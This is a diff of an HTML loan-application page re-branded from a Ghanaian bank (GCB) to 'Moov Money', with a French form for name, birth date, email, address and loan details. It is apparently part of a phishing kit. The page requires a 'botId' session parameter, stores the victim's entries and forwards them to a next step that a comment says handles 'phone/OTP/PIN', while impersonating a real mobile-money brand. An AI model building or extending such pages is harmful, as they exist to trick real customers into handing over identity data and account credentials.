@@ -1,240 +1,320 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Loan Application</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moov Money - Demande de prêt</title>
 
-<style>
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:#f5f5f5;
-}
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
 
-/* HEADER */
-.header{
-  width:100%;
-  background:#fff;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  padding:20px 0 10px;
-  border-bottom:1px solid #eee;
-}
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-.header img{
-  max-width:160px;
-  height:auto;
-  margin-bottom:8px;
-}
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #0a0a0a;
+            padding: 40px 24px 32px;
+            border-radius: 0;
+        }
 
-.bank-text{
-  font-size:14px;
-  font-weight:bold;
-  color:#000;
-  letter-spacing:1px;
-}
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
 
-/* CONTAINER */
-.container{
-  max-width:420px;
-  margin:auto;
-  padding:20px;
-}
+        .logo-circle {
+            width: 56px;
+            height: 56px;
+            background: #9A0000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 28px;
+            font-weight: 700;
+            color: #fff;
+        }
 
-/* PAGE HEADER */
-.page-header h1{
-  margin:0;
-  font-size:22px;
-  color:#0a8f55;
-}
+        .moov-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #9A0000;
+            letter-spacing: 0.5px;
+        }
 
-.page-header p{
-  margin:6px 0 18px;
-  font-size:14px;
-  color:#777;
-}
+        .page-header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+        }
 
-/* FORM */
-form label{
-  font-size:14px;
-  display:block;
-  margin-bottom:6px;
-  color:#444;
-}
+        .page-header p {
+            font-size: 15px;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 28px;
+        }
 
-form input,
-form select{
-  width:100%;
-  padding:14px;
-  font-size:16px;
-  margin-bottom:20px;
-  border-radius:12px;
-  border:1px solid #ccc;
-  outline:none;
-}
+        form label {
+            font-size: 14px;
+            color: rgba(255,255,255,0.6);
+            display: block;
+            margin-bottom: 6px;
+        }
 
-form input:focus,
-form select:focus{
-  border-color:#0a8f55;
-}
+        form input,
+        form select {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.05);
+            color: #ffffff;
+            outline: none;
+            transition: border-color 0.3s;
+            margin-bottom: 18px;
+        }
 
-/* CHECKBOX */
-.checkbox-wrapper{
-  display:flex;
-  gap:10px;
-  margin-bottom:18px;
-  font-size:14px;
-  color:#444;
-  align-items:flex-start;
-}
+        form input:focus,
+        form select:focus {
+            border-color: #9A0000;
+        }
 
-.checkbox-wrapper input{
-  width:auto;
-  margin-top:3px;
-}
+        form input::placeholder,
+        form select option {
+            color: rgba(255,255,255,0.3);
+        }
 
-/* BUTTON */
-button{
-  width:100%;
-  padding:16px;
-  font-size:16px;
-  background:#0a8f55;
-  color:white;
-  border:none;
-  border-radius:12px;
-  cursor:pointer;
-  opacity:0.5;
-}
+        form select option {
+            background: #1a1a1a;
+            color: #fff;
+        }
 
-button.enabled,
-button:enabled{
-  opacity:1;
-  cursor:pointer;
-}
-</style>
+        .checkbox-wrapper {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            align-items: flex-start;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            min-width: 18px;
+            margin-top: 2px;
+            accent-color: #9A0000;
+            cursor: pointer;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 4px;
+        }
+
+        .checkbox-wrapper label {
+            cursor: pointer;
+            margin-bottom: 0;
+            color: rgba(255,255,255,0.5);
+        }
+
+        .checkbox-wrapper label strong {
+            color: #9A0000;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: #9A0000;
+            color: #ffffff;
+            opacity: 0.5;
+        }
+
+        button:enabled {
+            opacity: 1;
+        }
+
+        button:hover:enabled {
+            background: #7a0000;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link button {
+            background: transparent;
+            border: none;
+            color: rgba(255,255,255,0.3);
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px;
+            width: auto;
+            opacity: 1;
+        }
+
+        .back-link button:hover {
+            color: rgba(255,255,255,0.6);
+        }
+
+        .footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.2);
+            letter-spacing: 0.5px;
+        }
+    </style>
 </head>
-
 <body>
 
-<!-- HEADER -->
-<!-- <div class="header">
-  <img src="GCB-logo.png" alt="GCB Logo">
-  <div class="bank-text">BANK OF GHANA</div>
-</div> -->
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo">
+            <div class="logo-circle">M</div>
+            <div class="moov-text">Moov Money</div>
+        </div>
 
-<div class="container">
+        <div class="page-header">
+            <h1>Demande de prêt</h1>
+            <p>Veuillez fournir vos informations personnelles</p>
+        </div>
 
-<div class="page-header">
-  <h1>Loan Application</h1>
-  <p>Provide your personal details</p>
-</div>
+        <form id="loanForm">
+            <label>Nom complet</label>
+            <input name="fullName" placeholder="Ex: Jean Dupont" required />
 
-<form id="loanForm">
+            <label>Date de naissance</label>
+            <input type="date" name="dob" required />
 
-  <label>Full name</label>
-  <input name="fullName" required />
+            <label>Adresse e-mail</label>
+            <input type="email" name="email" placeholder="exemple@email.com" required />
 
-  <label>Date of birth</label>
-  <input type="date" name="dob" required />
+            <label>Adresse résidentielle</label>
+            <input name="address" placeholder="Votre adresse complète" required />
 
-  <label>Email address</label>
-  <input type="email" name="email" required />
+            <label>Situation professionnelle</label>
+            <select name="employmentStatus" required>
+                <option value="">Sélectionnez</option>
+                <option>Employé</option>
+                <option>Indépendant</option>
+                <option>Sans emploi</option>
+                <option>Étudiant</option>
+            </select>
 
-  <label>Residential address</label>
-  <input name="address" required />
+            <label>Objet du prêt</label>
+            <select name="loanPurpose" required>
+                <option value="">Sélectionnez</option>
+                <option>Affaires</option>
+                <option>Personnel</option>
+                <option>Éducation</option>
+                <option>Médical</option>
+                <option>Urgence</option>
+            </select>
 
-  <label>Employment status</label>
-  <select name="employmentStatus" required>
-    <option value="">Select</option>
-    <option>Employed</option>
-    <option>Self-employed</option>
-    <option>Unemployed</option>
-    <option>Student</option>
-  </select>
+            <label>Montant du prêt (FCFA)</label>
+            <input type="number" name="loanAmount" required placeholder="MIN 4 000" min="4000" max="25000000" />
 
-  <label>Loan purpose</label>
-  <select name="loanPurpose" required>
-    <option value="">Select</option>
-    <option>Business</option>
-    <option>Personal</option>
-    <option>Education</option>
-    <option>Medical</option>
-    <option>Emergency</option>
-  </select>
+            <label>Durée du prêt</label>
+            <select name="loanTerm" required>
+                <option value="">Sélectionnez</option>
+                <option>6 mois</option>
+                <option selected>12 mois</option>
+                <option>24 mois</option>
+                <option>36 mois</option>
+                <option>48 mois</option>
+            </select>
 
-  <label>Loan amount (GHS)</label>
-  <input type="number" name="loanAmount" required placeholder="MIN 100" min="100" max="100000" />
+            <div class="checkbox-wrapper">
+                <input type="checkbox" id="termsCheck" required />
+                <label for="termsCheck">J'accepte les conditions générales</label>
+            </div>
 
-  <label>Loan term</label>
-  <select name="loanTerm" required>
-    <option value="">Select</option>
-    <option>6 months</option>
-    <option>12 months</option>
-    <option>24 months</option>
-    <option>36 months</option>
-    <option>48 months</option>
-  </select>
+            <div class="checkbox-wrapper">
+                <input type="checkbox" id="interestCheck" required />
+                <label for="interestCheck">
+                    Je comprends que les prêts sont soumis à un taux d'intérêt de <strong>8 % à 15 % par mois</strong>
+                    selon la solvabilité et le montant.
+                </label>
+            </div>
 
-  <div class="checkbox-wrapper">
-    <input type="checkbox" id="termsCheck" />
-    <label for="termsCheck">I agree to the Terms and Conditions</label>
-  </div>
+            <button id="continueBtn" type="submit" disabled>Continuer</button>
+        </form>
 
-  <div class="checkbox-wrapper">
-    <input type="checkbox" id="interestCheck" />
-    <label for="interestCheck">
-      I understand loans are subject to <strong>8%–15% interest per month</strong>
-      depending on credit score and loan amount.
-    </label>
-  </div>
+        <div class="back-link">
+            <button onclick="history.back()">Retour</button>
+        </div>
 
-  <button id="continueBtn" type="submit" disabled>Continue</button>
+        <div class="footer">v 5.3.2 (1.0.0)</div>
+    </div>
 
-</form>
+    <script>
+        // ---------- BOT ID ----------
+        const params = new URLSearchParams(window.location.search);
+        const urlBotId = params.get('botId');
+        if (urlBotId) localStorage.setItem('botId', urlBotId);
+        const botId = localStorage.getItem('botId');
 
-</div>
+        if (!botId) {
+            alert('Session invalide. Veuillez recommencer.');
+            window.location.href = 'index.html';
+        }
 
-<script>
-const form = document.getElementById('loanForm');
-const termsCheck = document.getElementById('termsCheck');
-const interestCheck = document.getElementById('interestCheck');
-const button = document.getElementById('continueBtn');
+        // ---------- FORM ELEMENTS ----------
+        const form = document.getElementById('loanForm');
+        const termsCheck = document.getElementById('termsCheck');
+        const interestCheck = document.getElementById('interestCheck');
+        const button = document.getElementById('continueBtn');
 
-// BOT SESSION LOGIC
-const params = new URLSearchParams(window.location.search);
-const urlBotId = params.get('botId');
+        // ---------- ENABLE BUTTON ----------
+        function updateButton() {
+            button.disabled = !(termsCheck.checked && interestCheck.checked);
+        }
 
-if(urlBotId){
-  localStorage.setItem('botId', urlBotId);
-}
+        termsCheck.addEventListener('change', updateButton);
+        interestCheck.addEventListener('change', updateButton);
 
-const botId = localStorage.getItem('botId');
+        // ---------- FORM SUBMIT ----------
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
 
-if(!botId){
-  alert('Invalid session. Please start again.');
-  window.location.href='/bot/bot1';
-}
+            // Save all form data
+            const data = Object.fromEntries(new FormData(form));
+            localStorage.setItem('loanFormData', JSON.stringify(data));
 
-// ENABLE BUTTON ONLY WHEN BOTH CHECKBOXES ARE CHECKED
-function updateButton(){
-  button.disabled = !(termsCheck.checked && interestCheck.checked);
-}
+            // Save the full name (used later in phone/OTP/PIN)
+            localStorage.setItem('fullName', data.fullName);
 
-termsCheck.addEventListener('change', updateButton);
-interestCheck.addEventListener('change', updateButton);
+            // Redirect to phone verification
+            window.location.href = `details.html?botId=${botId}`;
+        });
 
-// FORM SUBMIT
-form.addEventListener('submit', (e)=>{
-  e.preventDefault();
-  const data = Object.fromEntries(new FormData(form));
-  localStorage.setItem('loanFormData', JSON.stringify(data));
-  localStorage.setItem('fullName', data.fullName);
-  window.location.href='details.html?botId=' + botId;
-});
-</script>
-
+        // ---------- BACK BUTTON ----------
+        document.querySelector('.back-link button').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.history.back();
+        });
+    </script>
 </body>
 </html>
